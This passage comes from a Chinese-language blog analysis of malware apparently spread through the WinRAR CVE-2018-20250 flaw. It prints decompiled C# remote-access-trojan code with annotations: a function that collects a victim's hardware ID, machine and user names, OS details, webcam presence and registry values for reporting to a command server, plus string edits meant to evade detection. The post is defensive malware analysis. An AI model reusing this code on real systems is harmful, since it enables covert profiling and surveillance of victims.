class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">No</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第九步：拼接额外配置/状态信息 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">VR</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">        </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.VR：可能是屏幕分辨率/程序版本号</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">         </span><span style="--0:#758575DD;--1:#A0ADA0">// 固定占位符，保持格式统一</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ACT</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">     </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.ACT()：可能是系统激活状态/恶意程序激活状态</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第十步：采集恶意程序自定义注册表项的32位值（插件/配置ID） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">regValues</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 读取HKCU\Software\[OK.RG]下所有32位长度的注册表值（可能是插件ID/加密密钥）</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">foreach</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">regName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">in</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">CurrentUser</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CreateSubKey</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Software</span><span style="--0:#C99076;--1:#A65E2B">\\</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">GetValueNames</span><span style="--0:#666666;--1:#999999">())</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">regName</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">32</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 32位长度→MD5/UUID类唯一标识</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">regValues</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">regName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">,</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex8</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 采集失败不影响整体，静默忽略</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 返回完整的信息字符串（供connect()函数上报C2）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">return</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">regValues</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="public static string inf(){    // 初始化信息串：以&#x22;ll&#x22;+自定义分隔符OK.Y开头（指令标识+分隔符）    string infoStr = &#x22;ll&#x22; + OK.Y;    try    {        // ========== 第一步：采集设备唯一标识（硬件ID+注册表版本值，加密） ==========        if (Operators.ConditionalCompareObjectEqual(OK.GTV(&#x22;vn&#x22;, &#x22;&#x22;), &#x22;&#x22;, false))        {            // 场景1：注册表&#x22;vn&#x22;值为空 → 解密OK.VN + 硬件唯一标识（OK.HWD）            string encryptedId = OK.DEB(ref OK.VN) + &#x22;_&#x22; + OK.HWD(); // OK.HWD=获取硬件ID（如主板/硬盘序列号）            infoStr += OK.ENB(ref encryptedId) + OK.Y; // OK.ENB=加密后拼接        }        else        {            // 场景2：注册表&#x22;vn&#x22;值非空 → 读取并解密vn值 + 硬件ID，加密拼接            string vnValue = Conversions.ToString(OK.GTV(&#x22;vn&#x22;, &#x22;&#x22;)); // 读注册表&#x22;vn&#x22;值            string encryptedId = OK.DEB(ref vnValue) + &#x22;_&#x22; + OK.HWD();            infoStr += OK.ENB(ref encryptedId) + OK.Y;        }    }    catch (Exception ex)    {        // 采集失败：仅用硬件ID加密补充，不中断流程        string encryptedHwd = OK.HWD();        infoStr += OK.ENB(ref encryptedHwd) + OK.Y;    }    // ========== 第二步：采集机器名（失败填??） ==========    try    {        infoStr += Environment.MachineName + OK.Y; // 受害主机的计算机名（如DESKTOP-XXXX）    }    catch (Exception ex2)    {        infoStr += &#x22;??&#x22; + OK.Y; // 采集失败填充占位符，保证数据结构完整    }    // ========== 第三步：采集当前登录用户名（失败填??） ==========    try    {        infoStr += Environment.UserName + OK.Y; // 受害用户账号（如Administrator/张三）    }    catch (Exception ex3)    {        infoStr += &#x22;??&#x22; + OK.Y;    }    // ========== 第四步：采集恶意程序最后修改时间（失败填??-??-??） ==========    try    {        // OK.LO=恶意程序自身的FileInfo对象，采集最后修改日期（用于确认程序是否被篡改）        infoStr += OK.LO.LastWriteTime.Date.ToString(&#x22;yy-MM-dd&#x22;) + OK.Y;    }    catch (Exception ex4)    {        infoStr += &#x22;??-??-??&#x22; + OK.Y;    }    infoStr += &#x22;&#x22; + OK.Y; // 填充空字段，保持分隔符结构一致    // ========== 第五步：采集系统版本（精简字符串，规避特征检测） ==========    try    {        // 关键操作：替换系统版本关键词，规避安全软件特征检测        string osName = OK.F.Info.OSFullName            .Replace(&#x22;Microsoft&#x22;, &#x22;&#x22;)    // 移除&#x22;Microsoft&#x22;，避免特征匹配            .Replace(&#x22;Windows&#x22;, &#x22;Win&#x22;)   // 替换为Win，混淆特征            .Replace(&#x22;®&#x22;, &#x22;&#x22;)            // 移除版权符号            .Replace(&#x22;™&#x22;, &#x22;&#x22;)            // 移除商标符号            .Replace(&#x22;  &#x22;, &#x22; &#x22;)          // 去多余空格            .Replace(&#x22; Win&#x22;, &#x22;Win&#x22;);     // 精简空格        infoStr += osName;    }    catch (Exception ex5)    {        infoStr += &#x22;??&#x22;;    }    // ========== 第六步：采集系统Service Pack版本（失败填0） ==========    infoStr += &#x22;SP&#x22;;    try    {        string[] spArray = Strings.Split(Environment.OSVersion.ServicePack, &#x22; &#x22;, -1, 0);        if (spArray.Length == 1) infoStr += &#x22;0&#x22;; // 无SP则填0        infoStr += spArray[spArray.Length - 1];  // 取SP版本号（如SP1→1）    }    catch (Exception ex6)    {        infoStr += &#x22;0&#x22;;    }    // ========== 第七步：采集系统位数（x86/x64，失败仅加分隔符） ==========    try    {        // Environment.SpecialFolder.ProgramFilesX86 = 38 → 该路径含x86表示64位系统        if (Environment.GetFolderPath((Environment.SpecialFolder)38).Contains(&#x22;x86&#x22;))        {            infoStr += &#x22; x64&#x22; + OK.Y;        }        else        {            infoStr += &#x22; x86&#x22; + OK.Y;        }    }    catch (Exception ex7)    {        infoStr += OK.Y;    }    // ========== 第八步：检测摄像头是否存在（Yes/No） ==========    if (OK.Cam()) // OK.Cam()：检测主机是否有摄像头（用于后续屏幕监控/偷拍）    {        infoStr += &#x22;Yes&#x22; + OK.Y;    }    else    {        infoStr += &#x22;No&#x22; + OK.Y;    }    // ========== 第九步：拼接额外配置/状态信息 ==========    infoStr += OK.VR + OK.Y;        // OK.VR：可能是屏幕分辨率/程序版本号    infoStr += &#x22;..&#x22; + OK.Y;         // 固定占位符，保持格式统一    infoStr += OK.ACT() + OK.Y;     // OK.ACT()：可能是系统激活状态/恶意程序激活状态    // ========== 第十步：采集恶意程序自定义注册表项的32位值（插件/配置ID） ==========    string regValues = &#x22;&#x22;;    try    {        // 读取HKCU\Software\[OK.RG]下所有32位长度的注册表值（可能是插件ID/加密密钥）        foreach (string regName in OK.F.Registry.CurrentUser.CreateSubKey(&#x22;Software\\&#x22; + OK.RG, 0).GetValueNames())        {            if (regName.Length == 32) // 32位长度→MD5/UUID类唯一标识            {                regValues += regName + &#x22;,&#x22;;            }        }    }    catch (Exception ex8)    {        // 采集失败不影响整体，静默忽略    }    // 返回完整的信息字符串（供connect()函数上报C2）    return infoStr + regValues;}"><div></div></button></div></figure></div>
<h2 id="总结">总结<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 总结" data-pagefind-ignore="" href="#总结">#</a></h2>
<p>系统的安全性往往取决于最薄弱的那个环节。 WinRAR 主程序固然安全，但一个 2005 年编写、十几年来无人维护的动态链接库（UNACEV2.DLL），却成了攻破整个系统的特洛伊木马。</p>
<p>对于普通用户而言，防御此类 Exploit 攻击最有效的方法，往往不是安装杀毒软件，而是及时更新你的常用软件。因为在 Exploit 的世界里，时间就是最强的武器。</p>  </article>   <image-viewer data-selector="article" data-options="{&#34;title&#34;:0,&#34;navbar&#34;:0}"></image-viewer> <script type="module" src="/nicky.cool/_astro/ImageViewer.astro_astro_type_script_index_0_lang.BbQHAm9u.js"></script>  <!-- Share --> <footer class="slide-enter animate-delay-1000! prose mx-auto mt-8 print:hidden"> <span class="font-mono op-50">&gt; </span> <span class="op-50">share on</span>  <a class="op-60 no-underline hover:op-100 op-50!" href="https://twitter.com/intent/tweet?text=Reading%20%40noknoku07_nok's%20https%3A%2F%2Fnickyl07.github.io%2Fnicky.cool%2Fblog%2F%25E9%259A%2590%25E7%25A7%2598%25E7%259A%2584%25E7%2588%2586%25E7%25A0%25B4%25E6%2589%258Bcve-2018-20250-winrar-%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%25A9%25E7%2594%25A8%25E6%25A0%25B7%25E6%259C%25AC%25E5%2588%2586%25E6%259E%2590%2F%0A%0AI%20think..." title="Tweet this post" aria-label="Tweet this post">  twitter</a>  <br> <span class="font-mono op-50">&gt; </span> <a class="op-60 no-underline hover:op-100 font-mono op-50!" href="/nicky.cool/blog/">  cd ..</a> </footer> <!-- Comments --> <div class="prose mx-auto mt-8"> <hr> <div class="giscus"></div> <script type="module">const e={giscus:[!0,{"data-repo":"lin-stephanie/astro-antfustyle-theme","data-repo-id":"R_kgDOLylKbA","data-category":"Giscus","data-category-id":"DIC_kwDOLylKbM4Cpugn","data-mapping":"title","data-strict":"0","data-reactions-enabled":"1","data-emit-metadata":"0","data-input-position":"bottom","data-lang":"zh"}]},a=`${location.origin}/giscus/light.css`,i=`${location.origin}/giscus/dark.css`,o=Array.isArray(e.giscus)&&e.giscus[1],s=document.createElement("script");Object.entries({...o,id:"giscus-script",src:"https://giscus.app/client.js",crossOrigin:"anonymous",async:""}).forEach(([t,c])=>{s.setAttribute(t,c)});const r=()=>{document.querySelectorAll("iframe.giscus-frame").forEach(t=>t.remove()),document.querySelectorAll("script#giscus-script").forEach(t=>t.remove())},n=()=>{if(!document.querySelector(".giscus"))return;const t=s.cloneNode(!0);t.setAttribute("data-theme",document.documentElement.classList.contains("dark")?i:a),document.body.appendChild(t)};document.addEventListener("astro:before-swap",r);document.addEventListener("astro:page-load",n);</script> </div> </main> <!-- Footer --> <footer class="slide-enter animate-delay-1600! px-7 mt-auto mb-8"> <div class="prose mx-auto op-50"> <div class="flex lt-sm:flex-col items-center text-sm whitespace-nowrap"> <span>© 2026 NickyWU</span> <span class="lt-sm:hidden">&nbsp;|&nbsp;</span> <span>
Powered by
<a class="op-60 no-underline hover:op-100 op-100! color-[--fg]!" href="https://github.com/lin-stephanie/astro-antfustyle-theme">  
Astro AntfuStyle Theme
</a> </span> </div> </div> </footer> <button id="to-top-button" class="z-50 fixed right-5 bottom-6
    w-10 h-10 rounded-full
    op-0 pointer-events-none op-transition
    lt-lgp:op-50! lt-lgp:bg-#8883 lt-lgp:dark:bg-#8886 lt-lgp:pointer-events-auto!
    hover:op-100! hover:bg-#8883 print:hidden" title="Scroll to top"> <div u-i-ri-arrow-up-line></div> </button> <script type="module">document.addEventListener("astro:page-load",()=>{const o=()=>{window.scrollTo({top:0})};document.getElementById("to-top-button")?.addEventListener("click",o)});const e=()=>{const t=document.getElementById("to-top-button");t&&window.matchMedia("(min-width: 1024px)").matches&&((window.scrollY||document.documentElement.scrollTop)<=300?(t.style.opacity="0",t.style.pointerEvents="none"):(t.style.opacity="0.3",t.style.pointerEvents="auto"))};window.addEventListener("scroll",e);</script> <!-- Panel Backdrop (on mobile) --> <div id="backdrop" class="hidden z-75 fixed inset-0 bg-[#ffffffcc] dark:bg-[#000000cc]" aria-hidden="true"></div> <script type="module" src="/nicky.cool/_astro/Backdrop.astro_astro_type_script_index_0_lang.CFnpENJb.js"></script> <!-- Progress Bar --> <script type="module" src="/nicky.cool/_astro/BaseLayout.astro_astro_type_script_index_0_lang.Bg06K9ze.js"></script> </body> </html>